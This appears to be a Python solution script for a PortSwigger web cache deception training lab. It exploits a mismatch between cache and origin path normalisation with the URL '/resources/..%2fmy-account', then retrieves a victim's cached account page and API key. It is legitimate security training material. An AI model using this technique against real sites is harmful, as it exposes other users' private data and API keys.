"""
Lab 4: Exploiting origin server normalization for web cache deception
https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-origin-server-normalization
Difficulty: Practitioner

📝 The mirror case of Lab 3: here the CACHE does NOT decode/resolve
dot-segments (so /resources/..%2fmy-account still matches its /resources/
prefix rule verbatim, literal string and all), while the ORIGIN DOES
resolve it, serving the real /my-account page underneath.
"""

from utils import get_session, cache_status, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def run():
    s = get_session()
    s.post(f"{TARGET}/login", data=WIENER)

    note("Step 1: confirm the cache does NOT resolve dot-segments — a 404")
    note("under /resources/ should still cache (X-Cache: hit on resend).")
    r = s.get(f"{TARGET}/resources/..%2fnonexistent")
    log(f"Status: {r.status_code}, X-Cache: {cache_status(r)!r}")
    r2 = s.get(f"{TARGET}/resources/..%2fnonexistent")
    log(f"Second request X-Cache: {cache_status(r2)!r}")

    note("Step 2: confirm the ORIGIN DOES resolve /resources/..%2fmy-account")
    note("back to the real account page.")
    r3 = s.get(f"{TARGET}/resources/..%2fmy-account")
    log(f"Status: {r3.status_code}, contains account info: "
        f"{'wiener' in r3.text or 'API' in r3.text}")

    note("Step 3: confirm the cache still matches its /resources/ rule and")
    note("stores this response, literal-string-matching the prefix.")
    r4 = s.get(f"{TARGET}/resources/..%2fmy-account")
    log(f"Second request X-Cache: {cache_status(r4)!r}")

    exploit_url = f"{TARGET}/resources/..%2fmy-account"
    log(f"Deliver this URL to carlos: {exploit_url}")

    note("After carlos visits it, fetch the same URL to retrieve his cached")
    note("API key.")
    r5 = s.get(exploit_url)
    log(f"Retrieved: {r5.text[:300]}")


if __name__ == "__main__":
    run()
